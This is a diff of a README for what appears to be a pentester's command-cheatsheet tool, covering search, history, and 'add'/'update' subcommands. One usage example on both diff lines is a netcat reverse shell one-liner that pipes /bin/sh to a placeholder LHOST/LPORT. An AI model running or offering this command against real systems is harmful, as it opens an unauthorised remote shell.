@@ -7,8 +7,8 @@ The goal of this project is to create an easier to use and updated replacement f
 - Ctrl+h to display a history of previously selected commands from the current session in a selectable list. 
 - up/down arrow keys to highlight a command from the current search or from the history. Pressing return copies that command to the clipboard.  
 - 'info' displays full information on the currently selected command.  'full information' is very sparse at the moment.  
-- 'add -c <command>' to add a new command to the database.  optional: -d to add a comment/description with the command.
-- 'update <column> <content>' to update a database column in the currently selected command.  At the moment the only columns to update are 'command', 'comment' and 'author'. Examples: 'update comment spawn a pty via python3', 'update author greg scharf', 'update command rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [LHOST] [LPORT] >/tmp/f'.  
+- 'add -c [command]' to add a new command to the database.  optional: -d to add a comment/description with the command.
+- 'update [column] [content]' to update a database column in the currently selected command.  At the moment the only columns to update are 'command', 'comment' and 'author'. Examples: 'update comment spawn a pty via python3', 'update author greg scharf', 'update command rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [LHOST] [LPORT] >/tmp/f'.  
 
 ## Currently Working On
 - 'set' command for variable replacement when selecting a command that has placeholders for LHOST, LPORT, etc.
